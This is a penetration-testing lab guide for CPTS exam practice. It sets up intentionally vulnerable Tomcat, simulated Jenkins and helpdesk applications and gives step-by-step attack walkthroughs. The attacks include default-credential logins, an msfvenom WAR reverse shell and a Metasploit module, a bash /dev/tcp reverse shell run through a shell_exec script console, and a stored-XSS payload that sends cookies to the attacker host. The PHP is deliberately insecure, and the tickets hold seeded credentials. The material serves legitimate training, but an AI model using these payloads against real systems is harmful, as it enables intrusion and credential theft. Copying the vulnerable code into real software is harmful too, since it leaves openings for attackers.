# CPTS Lab: Attacking Common Applications

## Objective

Set up three real-world applications on your VMs and practice the CPTS-specific skill of identifying, enumerating, and exploiting enterprise software. Each application demonstrates a different attack path.

---

## Application 1: Apache Tomcat — WAR File Upload

### Setup (Debian — 192.168.244.132)

```bash
# Install Java and Tomcat
sudo apt update
sudo apt install default-jdk tomcat10 tomcat10-admin -y

# Configure Tomcat manager with default-like credentials
cat << 'EOF' | sudo tee /etc/tomcat10/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users>
  <role rolename="manager-gui"/>
  <role rolename="manager-script"/>
  <role rolename="admin-gui"/>
  <user username="tomcat" password="s3cret" roles="manager-gui,manager-script,admin-gui"/>
</tomcat-users>
EOF

# Allow manager access from any IP (lab only)
sudo sed -i 's/allow="127\\.\\d+\\.\\d+\\.\\d+/allow=".*/' /usr/share/tomcat10-admin/manager/META-INF/context.xml 2>/dev/null

# Create a flag
echo "FLAG{tomcat_war_upload_rce}" | sudo tee /root/tomcat_flag.txt
sudo chmod 600 /root/tomcat_flag.txt

sudo systemctl restart tomcat10
echo "Tomcat running on port 8080"
```

### Attack walkthrough

```bash
# Step 1: Discovery
nmap -sV -p 8080 192.168.244.132
# 8080/tcp open http Apache Tomcat

# Step 2: Identify Tomcat version
curl -s http://192.168.244.132:8080/ | grep -i "tomcat\|version"

# Step 3: Try the manager interface
curl http://192.168.244.132:8080/manager/html
# 401 Unauthorized — needs credentials
```

**Step 4: Try default credentials**

Try each one until one works:

```bash
curl -u tomcat:tomcat http://192.168.244.132:8080/manager/html
curl -u admin:admin http://192.168.244.132:8080/manager/html
curl -u tomcat:s3cret http://192.168.244.132:8080/manager/html
# One of these should return the manager page instead of 401
```

**Why try multiple defaults:** Tomcat installations frequently keep default or weak credentials. On the CPTS, always try the default credentials table from module 22 before brute forcing.

**Step 5: Generate and deploy a WAR shell**

```bash
# Generate a reverse shell payload as a WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.244.129 LPORT=4444 -f war -o shell.war
```

**What a WAR file is:** A Web Application ARchive — it's a ZIP file containing a Java web application. When deployed to Tomcat, the contents are extracted and the JSP files become accessible through the web server. Your shell.war contains a JSP reverse shell.

```bash
# Deploy through the manager (command line)
curl -u tomcat:s3cret "http://192.168.244.132:8080/manager/text/deploy?path=/shell" --upload-file shell.war
# Response: OK - Deployed application at context path [/shell]

# Start your listener
nc -lvnp 4444

# Trigger the shell
curl http://192.168.244.132:8080/shell/
# Shell arrives on your listener!

whoami
# tomcat (or the Tomcat service user)
```

**Step 6: Alternative — Metasploit module**

```bash
msfconsole -q
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.244.132
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set LHOST 192.168.244.129
set PAYLOAD java/meterpreter/reverse_tcp
exploit
# Meterpreter session on the Tomcat server
```

---

## Application 2: Jenkins — Script Console RCE

### Setup (CentOS — 192.168.244.131)

```bash
# Install Java and Jenkins
sudo dnf install java-17-openjdk wget -y
sudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo
sudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io-2023.key
sudo dnf install jenkins -y 2>/dev/null

# If Jenkins repo isn't available, use a Docker alternative:
sudo dnf install docker -y 2>/dev/null
sudo systemctl enable --now docker
sudo docker run -d --name jenkins -p 8080:8080 -p 50000:50000 \
  -e JENKINS_OPTS="--argumentsRealm.passwd.admin=admin --argumentsRealm.roles.admin=admin" \
  jenkins/jenkins:lts 2>/dev/null

# Or simplest: fake Jenkins with PHP
sudo dnf install httpd php -y
sudo systemctl enable --now httpd

sudo mkdir -p /var/www/html/jenkins
cat << 'PHPEOF' | sudo tee /var/www/html/jenkins/login.php
<?php
session_start();
$msg = "";
if(isset($_POST['j_username']) && isset($_POST['j_password'])) {
    if($_POST['j_username'] === 'admin' && $_POST['j_password'] === 'admin') {
        $_SESSION['auth'] = true;
        header('Location: dashboard.php');
        exit;
    }
    $msg = "<p style='color:red'>Invalid credentials</p>";
}
?>
<html><body>
<h1>Jenkins</h1><h2>Sign in</h2>
<form method="POST">
Username: <input name="j_username"><br><br>
Password: <input type="password" name="j_password"><br><br>
<button type="submit">Sign in</button>
</form>
<?php echo $msg; ?>
</body></html>
PHPEOF

cat << 'PHPEOF' | sudo tee /var/www/html/jenkins/dashboard.php
<?php session_start(); if(!isset($_SESSION['auth'])) { header('Location: login.php'); exit; } ?>
<html><body>
<h1>Jenkins Dashboard</h1>
<p>Welcome, admin</p>
<ul>
    <li><a href="script.php">Script Console</a></li>
    <li><a href="credentials.php">Credentials</a></li>
</ul>
</body></html>
PHPEOF

cat << 'PHPEOF' | sudo tee /var/www/html/jenkins/script.php
<?php
session_start();
if(!isset($_SESSION['auth'])) { header('Location: login.php'); exit; }
$output = "";
if(isset($_POST['script'])) {
    $cmd = $_POST['script'];
    // Simulate Groovy execution by running bash
    $output = shell_exec($cmd . " 2>&1");
}
?>
<html><body>
<h1>Script Console</h1>
<p>Type in a command to execute on the server.</p>
<form method="POST">
<textarea name="script" rows="10" cols="60" placeholder="Enter command..."></textarea><br><br>
<button type="submit">Run</button>
</form>
<?php if($output): ?>
<h2>Result:</h2>
<pre><?php echo htmlspecialchars($output); ?></pre>
<?php endif; ?>
</body></html>
PHPEOF

cat << 'PHPEOF' | sudo tee /var/www/html/jenkins/credentials.php
<?php session_start(); if(!isset($_SESSION['auth'])) { header('Location: login.php'); exit; } ?>
<html><body>
<h1>Stored Credentials</h1>
<table border="1" cellpadding="8">
<tr><th>ID</th><th>Domain</th><th>Username</th><th>Description</th></tr>
<tr><td>1</td><td>global</td><td>deploy_user</td><td>Deployment SSH key for 172.16.0.2</td></tr>
<tr><td>2</td><td>global</td><td>db_admin</td><td>Database admin — password: Db@dm1n2026!</td></tr>
</table>
<p><em>Note: Actual credentials are masked. Check Jenkins credential store for values.</em></p>
</body></html>
PHPEOF

echo "FLAG{jenkins_script_console_rce}" | sudo tee /root/jenkins_flag.txt
sudo chmod 600 /root/jenkins_flag.txt

sudo iptables -I INPUT -p tcp --dport 80 -j ACCEPT 2>/dev/null
echo "Jenkins simulation running on port 80 at /jenkins/"
```

### Attack walkthrough

```bash
# Step 1: Discover the application
curl http://192.168.244.131/jenkins/login.php
# Shows Jenkins login page

# Step 2: Try default credentials
curl -X POST http://192.168.244.131/jenkins/login.php \
  -d "j_username=admin&j_password=admin" -v -c cookies.txt -L
# Login succeeds — redirects to dashboard
```

**Why `admin:admin` works:** Jenkins installations frequently use default admin credentials, especially in development/staging environments. The CPTS exam targets exactly this kind of real-world misconfiguration.

```bash
# Step 3: Access the script console
curl -b cookies.txt http://192.168.244.131/jenkins/script.php

# Step 4: Execute commands through the script console
curl -b cookies.txt -X POST http://192.168.244.131/jenkins/script.php \
  -d "script=whoami"
# Shows: apache (or jenkins user)

curl -b cookies.txt -X POST http://192.168.244.131/jenkins/script.php \
  -d "script=cat+/etc/passwd"

curl -b cookies.txt -X POST http://192.168.244.131/jenkins/script.php \
  -d "script=cat+/root/jenkins_flag.txt"
```

**Step 5: Get a reverse shell**

```bash
# Start listener on Kali
nc -lvnp 4444

# Execute reverse shell through script console
curl -b cookies.txt -X POST http://192.168.244.131/jenkins/script.php \
  --data-urlencode "script=bash -c 'bash -i >& /dev/tcp/192.168.244.129/4444 0>&1'"
```

**Step 6: Check stored credentials for lateral movement**

```bash
curl -b cookies.txt http://192.168.244.131/jenkins/credentials.php
# Reveals: deploy_user for 172.16.0.2, db_admin password Db@dm1n2026!
# These credentials lead to other machines in the network
```

---

## Application 3: Web App with Multiple Vulnerabilities (simulating osTicket/custom app)

### Setup (Debian — add to existing Apache)

```bash
sudo mkdir -p /var/www/html/helpdesk

# Ticket creation with stored XSS
cat << 'PHPEOF' | sudo tee /var/www/html/helpdesk/index.php
<?php
session_start();
$tickets = $_SESSION['tickets'] ?? [];
$msg = "";

if(isset($_POST['subject']) && isset($_POST['body'])) {
    $ticket = [
        'id' => count($tickets) + 1001,
        'subject' => $_POST['subject'],
        'body' => $_POST['body'],  // No sanitization — stored XSS!
        'status' => 'Open',
        'created' => date('Y-m-d H:i')
    ];
    $tickets[] = $ticket;
    $_SESSION['tickets'] = $tickets;
    $msg = "<p style='color:green'>Ticket #{$ticket['id']} created.</p>";
}
?>
<html><body>
<h1>IT Helpdesk</h1>
<p><a href="admin.php">Staff Panel</a></p>

<h2>Submit a Ticket</h2>
<form method="POST">
Subject: <input name="subject" size="40"><br><br>
Description:<br>
<textarea name="body" rows="5" cols="40"></textarea><br><br>
<button type="submit">Submit</button>
</form>
<?php echo $msg; ?>
</body></html>
PHPEOF

# Staff panel — displays ticket content without escaping (stored XSS)
cat << 'PHPEOF' | sudo tee /var/www/html/helpdesk/admin.php
<?php
session_start();
$tickets = $_SESSION['tickets'] ?? [];

// Seed some default tickets with useful information
if(empty($tickets)) {
    $tickets = [
        ['id' => 1001, 'subject' => 'VPN Setup', 'body' => 'Please set up VPN for new hire. Temp password: VpnN3wH1re!', 'status' => 'Open', 'created' => '2026-07-30 09:00'],
        ['id' => 1002, 'subject' => 'Server Access', 'body' => 'Need SSH access to dev server. My username is sarah, please use password S@rahD3v! for the dev environment at 172.16.0.2', 'status' => 'Open', 'created' => '2026-07-31 14:00'],
        ['id' => 1003, 'subject' => 'Password Reset', 'body' => 'Reset admin password for backup portal to: B@ckupAdm1n!', 'status' => 'Closed', 'created' => '2026-08-01 10:00'],
    ];
    $_SESSION['tickets'] = $tickets;
}
?>
<html><body>
<h1>Staff Panel — All Tickets</h1>
<table border="1" cellpadding="8">
<tr><th>ID</th><th>Subject</th><th>Description</th><th>Status</th><th>Created</th></tr>
<?php foreach($tickets as $t): ?>
<tr>
    <td><?= $t['id'] ?></td>
    <td><?= htmlspecialchars($t['subject']) ?></td>
    <td><?= $t['body'] ?></td>
    <td><?= $t['status'] ?></td>
    <td><?= $t['created'] ?></td>
</tr>
<?php endforeach; ?>
</table>
</body></html>
PHPEOF

echo "Helpdesk running at /helpdesk/"
```

### Attack walkthrough

```bash
# Step 1: Browse the helpdesk
curl http://192.168.244.132/helpdesk/
# Shows ticket submission form

# Step 2: Access the staff panel (no authentication — misconfiguration)
curl http://192.168.244.132/helpdesk/admin.php
# Shows ALL tickets including sensitive information:
# - VPN temp password: VpnN3wH1re!
# - SSH creds: sarah / S@rahD3v! for 172.16.0.2
# - Backup portal admin password: B@ckupAdm1n!
```

**Why this is realistic:** Help desk ticketing systems often contain credentials in ticket bodies. IT staff email passwords, share VPN configs, and document server access in tickets. On a CPTS exam, these tickets chain you to the next machine.

```bash
# Step 3: Stored XSS — inject a cookie stealer
curl -X POST http://192.168.244.132/helpdesk/ \
  -d "subject=Help needed&body=<script>new Image().src='http://192.168.244.129:8080/?c='+document.cookie</script>"

# When a staff member views the ticket in admin.php, the JavaScript executes
# and sends their session cookie to your listener

# Step 4: Use found credentials
ssh sarah@172.16.0.2    # If tunnel is set up
# Password: S@rahD3v!
```

---

## Cleanup

```bash
# Tomcat
sudo systemctl stop tomcat10
sudo apt remove tomcat10 tomcat10-admin -y 2>/dev/null
sudo rm /root/tomcat_flag.txt

# Jenkins simulation (CentOS)
sudo rm -rf /var/www/html/jenkins /root/jenkins_flag.txt

# Helpdesk (Debian)
sudo rm -rf /var/www/html/helpdesk
```
